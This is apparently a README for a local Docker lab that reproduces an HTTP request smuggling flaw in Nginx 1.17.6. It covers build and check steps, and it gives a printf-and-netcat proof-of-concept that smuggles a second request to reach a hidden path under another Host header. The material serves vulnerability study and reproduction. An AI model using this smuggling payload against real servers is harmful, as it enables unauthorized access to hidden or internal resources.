#	Nginx - Http Smuggling

##	Composition

Nginx 1.17.6



##	Usage

Only for PoC.

###	build

```bash
docker-compose up -d
```

The nginx server will on the port 9015.



###	check

```bash
$ chmod +x check.sh;./check.sh|grep HTTP
HTTP/1.1 302 Moved Temporarily
```

1 HTTP code 302 means all right! 

Enjoy!



###	reproduce

```bash
printf 'GET /a HTTP/1.1\r\n'\
'Host: localhost\r\n'\
'Content-Length: 56\r\n'\
'\r\n'\
'GET /_hidden/index.html HTTP/1.1\r\n'\
'Host: notlocalhost\r\n'\
'\r\n'\
|nc -w 1 127.0.0.1 9015
```



#	Reference

https://bertjwregeer.keybase.pub/2019-12-10%20-%20error_page%20request%20smuggling.pdf